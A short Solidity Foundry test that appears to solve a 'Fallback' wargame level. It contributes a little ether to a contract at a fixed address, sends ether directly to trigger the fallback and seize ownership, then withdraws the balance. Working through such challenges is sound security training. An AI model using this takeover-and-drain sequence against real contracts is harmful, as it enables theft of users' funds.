// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Fallback} from "../src/Fallback.sol";

contract FallbackTest is Test {
    Fallback f;
    address addr = 0x5f55Bd0c4699f64ED5ED469F933223CC05b67820;
    address me = 0xB9f16b5a5D773be3Ec4A383dbc7316a515430605;

    function setUp() public {
        
        f = Fallback(payable(addr));

    }

    function test_1() public {
        console.log(f.contributions(f.owner()));

        //vm.startPrank(me);

        f.contribute{value: 0.0001 ether}();

        address(f).call{value: 0.00001 ether}("");

        console.log(f.owner());

        f.withdraw();

        //vm.stopPrank();
    }

    receive() external payable {

    }
}
